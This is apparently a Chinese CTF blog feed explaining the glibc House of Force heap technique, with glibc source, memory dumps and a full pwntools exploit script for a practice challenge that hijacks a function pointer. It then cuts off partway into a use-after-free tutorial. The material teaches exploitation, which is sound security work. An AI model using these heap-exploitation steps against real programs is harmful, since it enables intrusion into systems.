    <title>House of Force攻击</title>
    <link href="/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/"/>
    <url>/2024/08/01/House-of-Force%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ol><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure><p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">remainder      = chunk_at_offset(victim, nb);<br>av-&gt;top        = remainder;<br><br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p><strong>与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size   = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h2 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h2><p>在学习完 HOF 的原理之后，我们这里通过一个示例来说明 HOF 的利用，这个例子的目标是通过 HOF 来篡改 <code>malloc@got.plt</code> 实现劫持程序流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> *ptr,*ptr2;<br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    ptr=(<span class="hljs-type">long</span> *)(((<span class="hljs-type">long</span>)ptr)+<span class="hljs-number">24</span>);<br>    *ptr=<span class="hljs-number">-1</span>;        <span class="hljs-comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">-4120</span>);  <span class="hljs-comment">// &lt;=== 减小top chunk指针</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);   <span class="hljs-comment">// &lt;=== 分配块实现任意地址写</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先，我们分配一个 0x10 字节大小的块</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x0000000000020fe1 &lt;=== top chunk<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>之后把 top chunk 的 size 改为 0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span> &lt;=== ptr<br><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>xffffffffffffffff &lt;=== top chunk size域被更改<br><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>  <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>注意此时的 top chunk 位置，当我们进行下一次分配的时候就会更改 top chunk 的位置到我们想要的地方</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:    <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000602020 &lt;=== top chunk此时一切正常<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>接下来我们执行<code>malloc(-4120);</code>，-4120 是怎么得出的呢？ 首先，我们需要明确要写入的目的地址，这里我编译程序后，0x601020 是 <code>malloc@got.plt</code> 的地址</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0x601020</span>:   <span class="hljs-number">0</span>x00007ffff<span class="hljs-number">7a91130</span> &lt;=== malloc@got.plt<br></code></pre></td></tr></table></figure><p>所以我们应该将 top chunk 指向 0x601010 处，这样当下次再分配 chunk 时，就可以分配到 <code>malloc@got.plt</code> 处的内存了。</p><p>之后明确当前 top chunk 的地址，根据前面描述，top chunk 位于 0x602020，所以我们可以计算偏移如下</p><p>0x601010-0x602020&#x3D;-4112</p><p>此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了无符号整数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br></code></pre></td></tr></table></figure><p>如果想要用户输入的大小经过内部的 <code>checked_request2size</code>可以得到这样的大小，即</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_SZ (sizeof(size_t))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p><ul><li>MALLOC_ALIGN_MASK : 是用于对齐的掩码。<ul><li>32位 ：0x07 </li><li>64位 ：0x0F</li></ul></li><li>MALLOC_ALIGNMENT ：是对齐的大小<ul><li>32位 ：8字节</li><li>64位 ：16字节</li></ul></li></ul><p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK == <span class="hljs-number">-4112</span><br></code></pre></td></tr></table></figure><ul><li>对于对齐情况<ul><li>req &#x3D; - 距离 - SIZE_SZ</li></ul></li><li>对于没有对齐情况<ul><li>req &#x3D; - 距离 - SIZE_SZ - MALLOC_ALIGN_MASK</li></ul></li></ul><p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7ffff7dd1b20</span> &lt;main_arena&gt;:\   <span class="hljs-number">0</span>x0000000100000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x0000000000601010 &lt;=== 可以观察到top chunk被抬高<br><span class="hljs-attribute">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;: <span class="hljs-number">0</span>x0000000000000000  <span class="hljs-number">0</span>x00007ffff7dd1b78<br></code></pre></td></tr></table></figure><p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p><p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">set_head(<span class="hljs-name">victim</span>, nb | PREV_INUSE |<br>        (<span class="hljs-name">av</span> != <span class="hljs-symbol">&amp;main_arena</span> ? NON_MAIN_ARENA : <span class="hljs-number">0</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>例题下载 ：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn143_1604">例题</a></p><p>非常经典的菜单</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011728057.png"></p><p>直接看关键点</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011730321.png" alt="edit函数"></p><p>edit函数存在堆溢出，我们可以通过这个漏洞来控制Top chunk的size字段</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011733131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011735542.png" alt="main函数"></p><p>输入5执行gondbye_meessage函数</p><p>利用思路：</p><ol><li>通过houseofforce，将topchunk的地址移到记录goodbye_messaged的chunk0处 </li><li>再次申请chunk，我们就能分配到chunk0</li><li>将goodbye_message改为后⻔函数的地址 </li><li>输⼊5调⽤v4[1],即可获得flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn143_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28117&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x000000000400AEB</span><br><span class="hljs-string">            b * 0x000000000400C65</span><br><span class="hljs-string">            b * 0x000000000400D7D</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length of name:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the new name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>flag = <span class="hljs-number">0x0000000000400D7F</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x41</span> , payload)<br>offset = -<span class="hljs-number">0x68</span><br>add(offset , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span> , p64(flag) * <span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>每一步堆的变换</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011740856.png" alt="修改Top chunk的size字段"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741988.png" alt="改变Top chunk的地址"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741669.png" alt="控制goodbye_messaged"></p>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF漏洞</title>
    <link href="/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是UAF"><a href="#什么是UAF" class="headerlink" title="什么是UAF"></a>什么是UAF</h2><p>UAF就是Use After Free，简单来说就是释放后再次被使用，分为一下几种情况：</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong></li></ul><p>目前我刚入门只碰见第一种，看别人的博客说后两种比较常见。**我们一般称释放后没有被设置为NULL的内存指针为dangling pointer(悬垂指针)**。</p><p>这里在how2heap上有个实验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br><span class="hljs-type">char</span>* a = <span 